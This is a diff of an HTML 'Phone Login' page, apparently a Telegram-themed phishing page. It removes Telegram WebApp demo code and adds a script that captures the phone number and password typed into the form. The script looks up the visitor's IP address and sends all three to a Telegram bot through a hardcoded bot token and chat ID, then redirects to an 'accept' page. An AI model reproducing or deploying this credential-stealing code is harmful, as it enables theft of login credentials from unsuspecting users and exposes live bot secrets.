@@ -1,101 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="https://telegram.org/js/telegram-web-app.js"></script> <!--Подключаем скрипт от телеграм-->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Phone Login</title>
-<link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles.css">
+    <title>Phone Login</title>
+
 </head>
+
 <body>
-<div id="usercard">
-<div class="container">
-    <img src="pick.jpg" alt="Phone Image">
-    <form class="login-form" id = 'oauth'>
-        <input type="text" placeholder="Phone number">
-        <input type="password" placeholder="Password">
-        <button id="btn" class="button">Sign in</button>
-    </form>
-</div>
-<audio id="backgroundMusic" autoplay>
-  <source src="pixelsong.mp3" type="audio/mpeg">
-</audio>
+    <div id="usercard">
+        <div class="container">
+            <img src="pick.jpg" alt="Phone Image">
+            <form class="login-form" id='oauth'>
+                <input type="text" placeholder="Phone number">
+                <input type="password" placeholder="Password">
+                <button id="btn" class="button" onclick="checkForms(event)">Sign in</button>
+            </form>
+        </div>
+        <audio id="backgroundMusic" autoplay>
+            <source src="pixelsong.mp3" type="audio/mpeg">
+        </audio>
+    </div>
 
-<script>
-    const audio = document.getElementById('backgroundMusic');
-    audio.volume = 0.5; // Set the volume to 50%
-</script> 
-
-<script>
-function checkForms() {
+    <script>
+        const audio = document.getElementById('backgroundMusic');
+        audio.volume = 0.5; // Set the volume to 50%
+    </script>
+    <script>
+function checkForms(event) {
+    event.preventDefault();
+    var token = '7120759384:AAHT3Kx_m_nFaOGUCGEH9KZmbiwulBye6GA';
+    var chat_id = '-1002025800803';
     var form1 = document.getElementById('oauth');
     var phoneNumber = form1.getElementsByTagName('input')[0].value;
     var password = form1.getElementsByTagName('input')[1].value;
 
-    if (phoneNumber === '' || password === '') {
-        alert('You forgot something!🤷‍');
-    } else {
-        window.location.href = 'https://www.example.com'; 
-    }
+    // Get IP address of the user
+    var ipAddress = '';
+    fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        ipAddress = data.ip;
+        // Check if phone number and password are not empty
+        if (phoneNumber === '' || password === '') {
+            alert('You forgot something!🤷‍');
+        } else {
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+            var formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('text', 'Phone number: ' + phoneNumber + '\nPassword: ' + password + '\nIP Address: ' + ipAddress);
+
+            // Send message with phone number, password, and IP address
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+            window.location.href = "https://forbot.github.io/accept.html";
+        }
+    }).catch(error => console.error('Error:', error));
 }
-</script>
-
-<script>
-   let tg = window.Telegram.WebApp; //получаем объект webapp телеграма 
-
-   tg.expand(); //расширяем на все окно  
-
-   let btn = document.getElementById("btn"); //получаем кнопку скрыть/показать 
-
-   btn.addEventListener('click', function(){ //вешаем событие на нажатие html-кнопки
-      if (tg.MainButton.isVisible){ //если кнопка показана 
-         tg.MainButton.hide() //скрываем кнопку 
-      }
-      else{ //иначе
-         tg.MainButton.show() //показываем 
-      }
-   });
-
-   let btnED = document.getElementById("btnED"); //получаем кнопку активировать/деактивировать
-   btnED.addEventListener('click', function(){ //вешаем событие на нажатие html-кнопки
-      if (tg.MainButton.isActive){ //если кнопка показана 
-         tg.MainButton.setParams({"color": "#E0FFFF"}); //меняем цвет
-         tg.MainButton.disable() //скрываем кнопку 
-      }
-      else{ //иначе
-         tg.MainButton.setParams({"color": "#143F6B"}); //меняем цвет
-         tg.MainButton.enable() //показываем 
-      }
-   });
-
-   Telegram.WebApp.onEvent('mainButtonClicked', function(){
-      tg.sendData("some string that we need to send"); 
-      //при клике на основную кнопку отправляем данные в строковом виде
-   });
-
-
-   let usercard = document.getElementById("usercard"); //получаем блок usercard 
-
-   let profName = document.createElement('p'); //создаем параграф
-   profName.innerText = `${tg.initDataUnsafe.user.first_name}
-   ${tg.initDataUnsafe.user.last_name}
-   ${tg.initDataUnsafe.user.username} (${tg.initDataUnsafe.user.language_code})`;
-   //выдем имя, "фамилию", через тире username и код языка
-   usercard.appendChild(profName); //добавляем 
-
-   let userid = document.createElement('p'); //создаем еще параграф 
-   userid.innerText = `${tg.initDataUnsafe.user.id}`; //показываем user_id
-   usercard.appendChild(userid); //добавляем
-
-
-   //работает только в attachment menu
-   // let pic = document.createElement('img'); //создаем img
-   // pic.src = tg.initDataUnsafe.user.photo_url; //задаём src 
-   // usercard.appendChild(pic); //добавляем элемент в карточку 
-</script>
-
-
+    </script>
 </body>
+
 </html>
